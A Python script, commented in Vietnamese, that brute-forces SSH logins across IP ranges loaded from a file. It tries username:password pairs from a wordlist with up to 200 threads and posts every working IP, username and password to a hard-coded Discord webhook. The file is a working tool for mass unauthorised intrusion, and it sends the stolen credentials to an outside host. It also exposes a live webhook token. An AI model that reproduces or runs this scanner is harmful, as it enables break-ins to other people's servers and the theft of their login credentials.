import paramiko
import ipaddress
import requests
from concurrent.futures import ThreadPoolExecutor

# Đường dẫn webhook của bạn
webhook_url = "https://discord.com/api/webhooks/1272787225653940224/mG7-EaJUMz_ThHseBKL3BBraeHH-MlIK7egLuDwTDVg3TKVavX3sgT_E6vIk6Qn8rDVd"

def send_webhook_message(ip, username, password):
    data = {
        "content": f"Đã tìm thấy VPS rồi anh em ơi! IP: {ip}, User: {username}, Pass: {password}"
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print(f"Đã gửi thông báo cho IP: {ip}")
    else:
        print(f"Gửi thông báo thất bại cho IP: {ip} - {response.status_code}")

def check_ssh_login(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5)
        print(f"Thành công: {ip} với user {username} và pass {password}")
        send_webhook_message(ip, username, password)
        ssh.close()
        return True
    except Exception as e:
        print(f"Không thành công: {ip} với user {username} và pass {password} - {e}")
        return False

def scan_ip(ip, user_pass_pairs):
    for username, password in user_pass_pairs:
        if check_ssh_login(ip, username, password):
            break  # Nếu tìm thấy VPS hợp lệ thì dừng lại

def scan_ip_range(ip_range, user_pass_pairs, max_workers=100):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for ip in ipaddress.IPv4Network(ip_range):
            executor.submit(scan_ip, str(ip), user_pass_pairs)

def load_ip_ranges(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def load_user_pass_pairs(filename):
    with open(filename, 'r') as file:
        return [tuple(line.strip().split(':')) for line in file if line.strip()]

# Tải dải IP từ ip.txt
ip_ranges = load_ip_ranges('ip.txt')

# Tải cặp user:pass từ Userpass.txt
user_pass_pairs = load_user_pass_pairs('Userpass.txt')

# Quét từng dải IP với từng cặp user:pass
for ip_range in ip_ranges:
    scan_ip_range(ip_range, user_pass_pairs, max_workers=200)  # Điều chỉnh số lượng luồng theo nhu cầu
